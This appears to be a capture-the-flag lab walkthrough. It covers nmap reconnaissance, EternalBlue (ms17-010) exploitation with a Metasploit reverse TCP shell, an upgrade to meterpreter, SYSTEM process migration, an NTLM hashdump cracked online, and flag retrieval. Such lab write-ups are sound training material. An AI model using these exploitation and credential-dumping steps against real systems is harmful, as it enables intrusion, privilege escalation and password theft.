---
date: 2026-03-02
tags:
  - exploitation
  - metasploit
  - nmap
---
# Recon
---
Target Machine: 10.65.165.217
Attack Machine: 10.65.71.161

On the attack machine, scan the victim using:
```shell
nmap -sV -sC --script vuln -oN blue.nmap <TARGET_MACHINE_IP>
```

From the scan, the victim machine is vulnerable to ms17-010.
![../PNG PDF JPEG/attachment-03022026.png](../PNG%20PDF%20JPEG/attachment-03022026.png)

# Gain Access
---
Start metasploit and use the exploitation code: `exploit/windows/smb/ms17_010_eternalblue`
- Set the RHOSTS to the victim machine IP address.
- Set the payload for the exploit using: `set payload windows/x64/shell/reverse_tcp`
![../PNG PDF JPEG/attachment-03022026-1.png](../PNG%20PDF%20JPEG/attachment-03022026-1.png)
Run the exploit using the `run` command.

![../PNG PDF JPEG/attachment-03022026-2.png](../PNG%20PDF%20JPEG/attachment-03022026-2.png)
Confirm that the exploit has run successfully.

# Escalate
---
To escalate a shell to a meterpreter shell, use the post module: `post/multi/manage/shell_to_meterpreter`

Set the SESSION option to the previous shell session and run the exploit.
![../PNG PDF JPEG/attachment-03022026-3.png](../PNG%20PDF%20JPEG/attachment-03022026-3.png)

Confirm that the meterpreter shell conversion is successful by running the `sessions -l` command and noting a second session running under the user NT AUTHORITY\SYSTEM.
![../PNG PDF JPEG/attachment-03022026-4.png](../PNG%20PDF%20JPEG/attachment-03022026-4.png)

Enter the new session using the `sessions 2` command, then list all processes running as NT AUTHORITY\SYSTEM. 
Select a process and migrate to the new process.
![../PNG PDF JPEG/attachment-03022026-5.png](../PNG%20PDF%20JPEG/attachment-03022026-5.png)

# Cracking
---
Within the elevated meterpreter shell, run the `hashdump` command to dump all passwords on the machine.
![../PNG PDF JPEG/attachment-03022026-6.png](../PNG%20PDF%20JPEG/attachment-03022026-6.png)
We can notice a non-default user with its corresponding NTLM password hash.

Copying this NTLM hash into an online NTLM hash cracker gives us the password in plaintext.
![../PNG PDF JPEG/attachment-03022026-7.png](../PNG%20PDF%20JPEG/attachment-03022026-7.png)

# Finding Flags
---
There are three flags present in the vulnerable system.

The first flag can be found in the system root.
Navigate back to session 1 (original shell) and `ls` the C drive to find flag1.txt.
![../PNG PDF JPEG/attachment-03022026-8.png](../PNG%20PDF%20JPEG/attachment-03022026-8.png)

The second and third flag can be found using the metasploit `search` command while in the meterpreter shell.
![../PNG PDF JPEG/attachment-03022026-9.png](../PNG%20PDF%20JPEG/attachment-03022026-9.png)
